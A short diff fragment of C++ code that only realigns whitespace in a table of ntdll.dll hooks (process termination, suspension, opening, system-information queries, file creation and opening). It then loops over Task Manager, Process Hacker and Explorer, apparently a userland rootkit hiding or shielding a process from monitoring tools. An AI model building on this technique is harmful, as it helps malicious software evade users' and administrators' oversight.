@@ -16,12 +16,12 @@ int main()
 	hook_container container =
 	{
 		// HOOK AS LOW AS POSSIBLE TO PREVENT CIRCUMVENTIONS
-		{ "ntdll.dll", "NtTerminateProcess", "ntterm" },
-		{ "ntdll.dll", "NtSuspendProcess", "ntsusp" },
-		{ "ntdll.dll", "NtOpenProcess", "ntop" },
-		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" },
-		{ "ntdll.dll", "NtCreateFile", "ntcr"},
-		{ "ntdll.dll", "NtOpenFile", "ntopf"}
+		{ "ntdll.dll", "NtTerminateProcess",		"ntterm" },
+		{ "ntdll.dll", "NtSuspendProcess",			"ntsusp" },
+		{ "ntdll.dll", "NtOpenProcess",				"ntop" },
+		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
+		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
+		{ "ntdll.dll", "NtOpenFile",				"ntopf"}
 	};
 
 	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "explorer.exe" })
